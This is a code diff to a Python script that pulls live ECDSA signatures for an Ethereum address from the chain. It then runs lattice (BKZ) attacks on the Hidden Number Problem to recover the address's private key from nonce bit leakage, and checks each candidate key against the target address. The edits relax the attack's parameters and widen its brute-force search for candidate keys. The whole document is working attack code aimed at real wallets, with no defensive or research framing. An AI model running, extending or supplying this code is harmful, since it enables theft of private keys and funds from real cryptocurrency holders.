@@ -217,7 +217,7 @@ def get_live_signatures(address):
         # if len(sigs) >= 20:
         #     print("ok")
         #     break # Higher count recommended for EIP-1559
-        if len(sigs) >= 150:
+        if len(sigs) >= 90:
             break
         # print(tx_data)
         tx = w3.eth.get_transaction(tx_data['hash'])
@@ -498,7 +498,7 @@ def solve_foundation_lattice(signatures, target_address):
     # print("[x] No key found. Check Z-hashes or increase Bias Bits.")
     return None
 
-def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
+def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
     """
     Solves HNP for LSB leakage (k = 2^B * k' + 0).
     sigs: list of (z, r, s)
@@ -509,8 +509,8 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
         # ONLY flip s if it is physically in the high range. 
         # Do NOT flip z. The relationship s = k^-1(z + rd) handles the sign of k.
         # if s >= HALF_N or v == 28:
-        if s >= HALF_N:
-        # if v == 28:
+        # if s >= HALF_N:
+        if v == 27:
             s_fixed = N - s
         else:
             s_fixed = s
@@ -556,7 +556,7 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
     # 3. BKZ Reduction
     print("[*] Starting LSB BKZ Reduction...")
     # Initialize with 3 arguments: GSO, LLL, and initial Params
-    init_params = BKZ.Param(block_size=40, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
+    init_params = BKZ.Param(block_size=32, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
     bkz = BKZ.Reduction(gso, lll_obj, init_params)
     bkz()
 
@@ -578,7 +578,7 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
                 if d_base <= 1: continue
 
                 # Neighborhood search for rounding errors
-                for drift in range(-100, 101):
+                for drift in range(-500, 501):
                     d_cand = (d_base + drift) % N
                     if multi_verify_address([d_cand, (N - d_cand) % N], target_address):                        
                         found = True
@@ -593,7 +593,7 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
                 r_inv = pow(r, -1, N)
                 
                 # Test variants including the "Fuzzer" for rounding drift
-                for drift in range(-100, 101):
+                for drift in range(-500, 501):
                     k_cand = (k_base + drift) % N
                     d_candidates = [
                         (s * k_cand - z) * r_inv % N,
